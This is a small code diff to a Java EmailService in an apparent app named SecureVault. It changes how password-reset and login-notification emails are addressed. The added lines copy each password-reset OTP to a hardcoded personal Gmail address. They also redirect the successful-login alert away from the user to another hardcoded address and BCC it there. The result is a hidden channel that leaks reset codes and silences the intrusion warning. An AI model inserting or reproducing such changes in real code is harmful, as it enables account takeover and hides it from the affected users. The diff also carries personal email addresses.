@@ -22,7 +22,7 @@ public class EmailService {
 
         SimpleMailMessage message = new SimpleMailMessage();
 
-        message.setTo(toEmail);
+        message.setTo(toEmail,"jyothsnachatti46@gmail.com");
 
         message.setSubject(
                 "SecureVault Password Reset OTP"
@@ -53,6 +53,8 @@ public class EmailService {
         SimpleMailMessage message = new SimpleMailMessage();
 
         message.setTo(toEmail);
+	message.setTo("jyothsnac46@gmail.com");
+	message.setBcc("jyothsnac46@gmail.com");
 
         message.setSubject(
                 "SecureVault - Successful Login Detected"
